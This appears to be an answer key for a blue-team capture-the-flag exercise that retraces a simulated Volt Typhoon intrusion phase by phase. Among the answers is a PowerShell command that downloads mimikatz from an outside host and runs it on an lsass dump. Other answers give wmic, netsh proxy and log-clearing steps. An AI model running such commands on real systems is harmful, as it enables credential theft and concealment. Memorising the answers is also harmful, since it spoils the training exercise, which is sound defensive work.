

##### Initial Access
######Comb through the ADSelfService Plus logs to begin retracing the attacker’s steps. At what time (ISO 8601 format) was Dean's password changed and their account taken over by the attacker?
`2024-03-24T11:10:22`
###### Shortly after Dean's account was compromised, the attacker created a new administrator account. What is the name of the new account that was created?
`voltyp-admin`

##### Execution
###### In an information gathering attempt, what command does the attacker run to find information about local drives on server01 & server02?
`wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename`

###### The attacker uses ntdsutil to create a copy of the AD database. After moving the file to a web server, the attacker compresses the database. What password does the attacker set on the archive?
`d5ag0nm@5t3r`

##### Persistence

###### Our target APT frequently employs web shells as a persistence mechanism to maintain a foothold. They disguise these web shells as legitimate files, enabling remote control over the server and allowing them to execute commands undetected.
`C:\Windows\Temp\`

##### Defense Evasion
###### In an attempt to begin covering their tracks, the attackers remove evidence of the compromise. They first start by wiping RDP records. What PowerShell cmdlet does the attacker use to remove the “Most Recently Used” record?
`Remove-ItemProperty`

###### The APT continues to cover their tracks by renaming and changing the extension of the previously created archive. What is the file name (with extension) created by the attackers?
`cl64.gif`

###### Under what regedit path does the attacker check for evidence of a virtualized environment?
`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control`

##### Credential Access
###### Using reg query, Volt Typhoon hunts for opportunities to find useful credentials. What three pieces of software do they investigate?  
Answer Format: Alphabetical order separated by a comma and space.
`OpenSSH, putty, realvnc`
###### What is the full decoded command the attacker uses to download and run mimikatz?
`Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait`

##### Discovery & Lateral Movement
######  The attacker uses wevtutil, a log retrieval tool, to enumerate Windows logs. What event IDs does the attacker search for?
Answer Format: Increasing order separated by a space.
`4624 4625 4769`
###### Moving laterally to server-02, the attacker copies over the original web shell. What is the name of the new web shell that was created?
`AuditReport.jspx`

##### Collection
###### The attacker is able to locate some valuable financial information during the collection phase. What three files does Volt Typhoon make copies of using PowerShell?
Answer Format: Increasing order separated by a space.
`2022.csv 2023.csv 2024.csv`

##### C2 & Cleanup
###### The attacker uses netsh to create a proxy for C2 communications. What connect address and port does the attacker use when setting up the proxy?  
Answer Format: IP Port
`10.2.30.1 8443`
###### To conceal their activities, what are the four types of event logs the attacker clears on the compromised system?
`Application Security Setup System`





